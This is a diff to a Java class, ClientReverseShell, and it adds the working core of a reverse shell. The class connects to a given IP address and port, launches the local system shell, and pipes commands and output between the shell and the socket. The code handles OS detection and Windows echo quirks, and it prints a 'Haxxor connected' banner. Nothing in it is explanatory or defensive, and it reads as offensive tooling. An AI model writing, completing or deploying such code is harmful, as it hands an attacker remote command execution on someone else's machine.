@@ -7,6 +7,7 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
 import java.net.Socket;
+import java.net.SocketTimeoutException;
 
 @NoArgsConstructor
 public class ClientReverseShell {
@@ -14,6 +15,9 @@ public class ClientReverseShell {
     private InetSocketAddress inetServerSocket;
     String detectedOs;
     String detectedShell;
+    private final byte[] buffer = new byte[1024];
+    private int charLen = 0;
+    private boolean error = false;
 
     public ClientReverseShell(String ipAddress, int port) {
         this.inetServerSocket = new InetSocketAddress(ipAddress, port);
@@ -71,18 +75,35 @@ public class ClientReverseShell {
 
         detectOperatingSystem();
 
-        try (Socket clientSocket = new Socket()) {
-
+        try {
+            Socket clientSocket = new Socket();
             clientSocket.setSoTimeout(100);
             clientSocket.connect(inetServerSocket);
 
             Process remoteShell = new ProcessBuilder(this.detectedShell).redirectInput(ProcessBuilder.Redirect.PIPE)
                     .redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();
-            OutputStream stdin = remoteShell.getOutputStream();
-            InputStream stdout = remoteShell.getInputStream();
-            InputStream stderr = remoteShell.getErrorStream();
             System.out.println("Haxxor connected “ψ (｀∇´) ψ ... ◥(ฅº￦ºฅ)◤ ...\n");
 
+            OutputStream remoteStdin = remoteShell.getOutputStream();
+            InputStream remoteStdout = remoteShell.getInputStream();
+            InputStream remoteStderr = remoteShell.getErrorStream();
+
+            InputStream clientSocketInput = clientSocket.getInputStream();
+            OutputStream clientSocketOutput = clientSocket.getOutputStream();
+            do {
+                if (!remoteShell.isAlive()) {
+                    System.out.println("Remote shell has been terminated\n\n");
+                    break;
+                }
+                this.readRemoteShell(clientSocketInput, remoteStdin, "SOCKET", "STDIN");
+                if (remoteStderr.available() > 0) {
+                    this.readRemoteShell(remoteStderr, clientSocketOutput, "STDERR", "SOCKET");
+                }
+                if (remoteStdout.available() > 0) {
+                    this.readRemoteShell(remoteStdout, clientSocketOutput, "STDOUT", "SOCKET");
+                }
+            } while (!this.error);
+            System.out.println("EXIT");
         } catch (IOException e) {
             throw new RuntimeException(e);
         }
@@ -101,6 +122,37 @@ public class ClientReverseShell {
         } else {
             detected = false;
             System.out.print("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
+        }
+    }
+
+    private void readRemoteShell(InputStream input, OutputStream output, String inputName, String outputName) {
+
+        int bytes = 0;
+        try {
+            do {
+                if (this.detectedOs.equals("WINDOWS") && inputName.equals("STDOUT") && this.charLen > 0) {
+                    do {
+                        bytes = input.read(this.buffer, 0, Math.min(this.charLen, this.buffer.length));
+                        this.charLen -= Math.min(this.charLen, this.buffer.length);
+                    } while (bytes > 0 && this.charLen > 0);
+                } else {
+                    bytes = input.read(this.buffer, 0, this.buffer.length);
+                    if (bytes > 0) {
+                        output.write(this.buffer, 0, bytes);
+                        output.flush();
+                        if (this.detectedOs.equals("WINDOWS") && outputName.equals("STDIN")) {
+                            this.charLen += bytes;
+                        }
+                    } else if (inputName.equals("SOCKET")) {
+                        this.error = true;
+                        System.out.print("SOC_ERROR: Shell connection has been terminated\n\n");
+                    }
+                }
+            } while (input.available() > 0);
+        } catch (SocketTimeoutException ignored) {
+        } catch (IOException ex) {
+            this.error = true;
+            System.out.println("STRM_ERROR: Cannot write to: " + outputName + ", or read from: " + inputName);
         }
     }
 }
